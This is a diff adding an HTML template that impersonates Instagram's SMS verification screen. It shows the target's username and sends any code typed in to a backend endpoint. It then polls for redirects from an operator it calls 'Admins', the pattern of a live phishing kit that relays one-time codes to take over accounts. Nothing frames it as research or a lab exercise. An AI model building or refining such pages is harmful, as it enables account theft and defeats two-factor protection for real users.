@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Check your text messages</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/sms.css') }}?v=1.1">
+  
+</head>
+<body>
+<div class="page">
+  <a href="/" class="back-btn">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 18l-6-6 6-6"/></svg>
+  </a>
+
+  <p class="subtitle">{{ username }} • Instagram</p>
+  <h1 class="title">Check your text messages</h1>
+  <p class="desc">Enter the code we sent to your number</p>
+
+  <div class="illustration">
+    <img src="https://static.cdninstagram.com/rsrc.php/y4/r/-oqrrS32EZ-.webp" alt="" class="illustration">
+  </div>
+
+  <input id="code" class="code-input" type="tel" placeholder="Code" maxlength="9" inputmode="numeric">
+
+  <div class="resend-row">
+    <div class="spinner" id="spinner"></div>
+    <span class="timer-text" id="timer-text">We can send a new code in <strong id="countdown">00:58</strong>.</span>
+    <button class="resend-btn" id="resend-btn">Send new code</button>
+  </div>
+
+  <label class="trust-row">
+    <input class="trust-check" type="checkbox" checked/>
+    <span class="trust-label">Trust this device and skip this step from now on</span>
+  </label>
+
+  <button class="btn-continue" id="continue-btn" disabled>Continue</button>
+  <button class="btn-other">Try another way</button>
+</div>
+
+<script>
+  const codeInput = document.getElementById("code");
+  const continueBtn = document.getElementById("continue-btn");
+  const countdownEl = document.getElementById("countdown");
+  const spinnerEl = document.getElementById("spinner");
+  const timerTextEl = document.getElementById("timer-text");
+  const resendBtn = document.getElementById("resend-btn");
+
+  // 1. Timer Logic
+  let secs = 58;
+  const tick = setInterval(() => {
+    secs--;
+    const mm = String(Math.floor(secs / 60)).padStart(2, "0");
+    const ss = String(secs % 60).padStart(2, "0");
+    if(countdownEl) countdownEl.textContent = `${mm}:${ss}`;
+    if (secs <= 0) {
+      clearInterval(tick);
+      spinnerEl.style.display = "none";
+      timerTextEl.innerHTML = "Didn't get a code?&nbsp;";
+      resendBtn.style.display = "inline";
+    }
+  }, 1000);
+
+  // 2. Button Activation (6 digits)
+  codeInput.addEventListener("input", () => {
+    const val = codeInput.value.replace(/\D/g, "");
+    codeInput.value = val;
+    if (val.length >= 6) {
+      continueBtn.classList.add("active");
+      continueBtn.disabled = false;
+    } else {
+      continueBtn.classList.remove("active");
+      continueBtn.disabled = true;
+    }
+  });
+
+  // 3. Submit & Start Redirect Polling
+  continueBtn.addEventListener("click", async () => {
+    if (continueBtn.disabled) return;
+    
+    // Change to loading state
+    continueBtn.innerHTML = '<div class="spinner" style="border-top-color:#fff; width:20px; height:20px; margin:0 auto;"></div>';
+    continueBtn.disabled = true;
+
+    // Send the code to backend
+    await fetch('/api/submit-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ code: codeInput.value })
+    });
+
+    // Start listening for the Admins redirect
+    startSmsPolling();
+  });
+
+  function startSmsPolling() {
+    const pollInterval = setInterval(async () => {
+      try {
+        const response = await fetch('/api/check-status');
+        const data = await response.json();
+
+        if (data.action === 'redirect') {
+          clearInterval(pollInterval);
+          window.location.href = data.url;
+        }
+        
+        if (data.action === 'error') {
+          alert(data.message);
+          continueBtn.innerHTML = 'Continue';
+          continueBtn.disabled = false;
+        }
+      } catch (e) { console.error("Polling error:", e); }
+    }, 2000);
+  }
+
+  
+</script>
+<script src="/static/js/main.js"></script>
+</body>
+</html>
